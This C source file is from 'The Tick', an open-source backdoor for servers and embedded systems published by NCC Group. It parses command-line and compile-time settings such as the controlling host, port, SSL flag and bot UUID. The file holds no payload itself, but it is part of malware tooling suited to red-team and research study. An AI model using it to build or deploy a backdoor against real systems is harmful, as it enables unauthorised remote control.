/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "config.h"
#include "base64.h"

// Nifty macro trick to expand using quotes.
// https://stackoverflow.com/a/3419392/426293
#define _Q(x) #x
#define QUOTE(x) _Q(x)

/****************************************************************************/

#if TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV || TICK_CONFIG_USE_FILE || TICK_CONFIG_USE_BIN

// Pointer to option handler function.
typedef int (*OptionHandler)(char *input, void *output, size_t size);

// Option definition structure.
typedef struct {
    char *name;             // Name of the option (without dashes).
    size_t offset;          // Offset of the Settings struct member.
    size_t size;            // Size of the Settings struct member.
    OptionHandler handler;  // Handler function to parse the value.
} Option;

// Option handler function for all supported types.
int _option_str(char *input, void *output, size_t size)
{
    strncpy(output, input, size);
    return 0;
}
int _option_int(char *input, void *output, size_t size)
{
    if (size != sizeof(int)) return -1;
    *((int *)(output)) = atoi(input);
    return 0;
}
int _option_bool(char *input, void *output, size_t size)
{
    if (size != sizeof(int)) return -1;
    int i = atoi(input);
    if (i != 0) i = 1;
    *((int *)(output)) = i;
    return 0;
}
int _option_base64(char *input, void *output, size_t size)
{
    if (size < 5) return -1;
    size_t length = base64_decode(input, output, size - 1);
    if (length == 0) return -1;
    *((char *)(output) + length) = 0;
    return 0;
}

// Aliases for the functions above.
#define OPTION_STRING _option_str
#define OPTION_NUMBER _option_int
#define OPTION_FLAG   _option_bool
#define OPTION_BLOB   _option_base64

// Macro to populate the Options structure more easily.
#define DEFINE_OPTION(name, member, handler) { QUOTE(name), offsetof(Settings, member), sizeof(((Settings*)0)->member), handler }

// Status Options structure with the supported options that will be parsed.
// Every option works as a positional argument based on the index of this table.
static const Option options_table[] = {
    DEFINE_OPTION("host",       hostname,   OPTION_STRING),
    DEFINE_OPTION("port",       port,       OPTION_NUMBER),
    DEFINE_OPTION("ssl",        use_ssl,    OPTION_FLAG),
    DEFINE_OPTION("uuid",       uuid,       OPTION_STRING),
};
static const int options_count = sizeof(options_table) / sizeof(options_table[0]);

// Find an option by short name (the first character).
// Returns an index into options_table[] or -1 if not found.
int find_short_option(char c)
{
    int i;
    for (i = 0; i < options_count; i++) {
        if (c == options_table[i].name[0]) {
            return i;
        }
    }
    return -1;
}

// Find an option by full name.
// Returns an index into options_table[] or -1 if not found.
int find_long_option(char *option)
{
    int i;
    for (i = 0; i < options_count; i++) {
        if (strcmp(option, options_table[i].name) == 0) {
            return i;
        }
    }
    return -1;
}

// Parse a single option value directly into the Settings structure.
// Returns 0 on success or -1 on failure.
int parse_option(Settings *s, int option_index, char *input)
{
    OptionHandler handler = options_table[option_index].handler;
    void *output = ((char *)s + options_table[option_index].offset);
    size_t size = options_table[option_index].size;
    return (*handler)(input, output, size);
}

#endif

/****************************************************************************/

#if TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV

// Parse the command line options directly into the Settings structure.
// This function will try its best to parse even if there are errors,
// but still returns 0 on success or -1 on failure.
int parse_command_line(Settings *s, int argc, char *argv[])
{
    int success = 0;
    int option_index;
    int pos = 0;
    int final = 0;

    // Trivial case.
    if (argc <= 1) {
        return 0;
    }

    // Loop for every command line argument except the first.
    // The first argument is assumed to be the executable.
    int i;
    for (i = 1; i < argc; i++) {
        option_index = -1;

        // Determine if it's a short option, a long option, or a positional.
        // Then find the option in options_table and set option_index.
        if (!final && argv[i][0] == '-') {
            if (argv[i][1] == '-') {
                if (argv[i][2] == 0) {

                    // It's a "--" on its own.
                    // This turns off option parsing,
                    // leaving only positional arguments.
                    final = 1;
                    continue;

                }

                // It's a long option.
                option_index = find_long_option(&argv[i][2]);
                i++;

            } else if (argv[i][2] == 0) {

                // It's a short option.
                option_index = find_short_option(argv[i][1]);
                i++;

            }
        } else {

            // It's a positional.
            if (pos >= options_count) {
                success = -1;
                continue;
            }
            option_index = pos;
            pos++;

        }
        if (option_index < 0) {
            success = -1;
            continue;
        }
        if (i == argc) break;

        // Parse the option.
        if (parse_option(s, option_index, argv[i]) < 0) {
            return -1;
        }
    }

    // Return 0 on success, -1 on failure.
    return success;
}

#endif

/****************************************************************************/

#if TICK_CONFIG_USE_ARGV
void get_configuration(Settings *s, int argc, char *argv[])
#else
void get_configuration(Settings *s)
#endif
{
    // Zero out the memory structure for the settings.
    // We need this because not all values will be set by the code below.
    memset(s, 0, sizeof(Settings));

    // Now initialize again to the default values.
    // These can be controlled at compile time from the makefile.
    // Useful for situations where you can't find a way to pass the
    // configuration to the bot, so you just make a custom build.
#ifdef TICK_CONFIG_HOSTNAME
    strncpy(s->hostname, QUOTE(TICK_CONFIG_HOSTNAME), sizeof(s->hostname));
#endif
#ifdef TICK_CONFIG_PORT
    s->port = TICK_CONFIG_PORT;
#endif
#if TICK_FEATURES_CRYPTO
#ifdef TICK_CONFIG_USE_SSL
    s->use_ssl = TICK_CONFIG_USE_SSL;
#endif
#endif

    // If appended configuration parsing is enabled, do it now.
#if TICK_CONFIG_USE_BIN

    // TODO
#   warning Feature not implemented: TICK_CONFIG_USE_BIN

#endif

    // If configuration file parsing is enabled, do it now.
#if TICK_CONFIG_USE_FILE

    // TODO
#   warning Feature not implemented: TICK_CONFIG_USE_FILE

#endif

    // If environment variable parsing is enabled, do it now.
#if TICK_CONFIG_USE_ENV

    // TODO
#   warning Feature not implemented: TICK_CONFIG_USE_ENV

#endif

    // If argv parsing is enabled, do it now.
#if TICK_CONFIG_USE_ARGV
    if (parse_command_line(s, argc, argv) < 0) {
        LOG("Error parsing command line! Continuing regardless...\n");
    }
#endif

}
